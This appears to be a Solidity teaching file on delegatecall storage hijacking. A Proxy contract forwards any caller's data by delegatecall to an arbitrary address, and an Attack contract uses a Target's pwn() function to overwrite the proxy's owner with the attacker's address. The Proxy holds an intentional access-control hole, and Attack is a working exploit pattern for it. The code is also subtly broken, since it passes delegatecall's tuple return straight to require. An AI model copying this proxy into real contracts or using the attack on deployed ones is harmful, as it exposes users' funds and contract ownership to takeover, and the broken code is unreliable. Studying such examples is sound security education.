// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract Proxy {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function forward(address callee, bytes calldata _data) public {
        require(callee.delegatecall(_data), "Delegatecall failed");
    }
}

contract Target {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public proxy;

    constructor(address _proxy) {
        proxy = _proxy;
    }

    function attack(address target) public {
        Proxy(proxy).forward(target, abi.encodeWithSignature("pwn()"));
    }
}

//In this example, the Proxy contract uses delegatecall to forward any call 
//it receives to an address provided by the user. The Target contract contains a call 
//to the pwn() function that changes the owner of the contract to the caller.

//The Attack contract takes advantage of this setup by calling the forward function of the Proxy contract, 
//passing the address of the Target contract and the encoded function call pwn(). 
//This results in the Proxy contract's storage being modified, specifically the owner variable,
// which is set to the attacker’s address.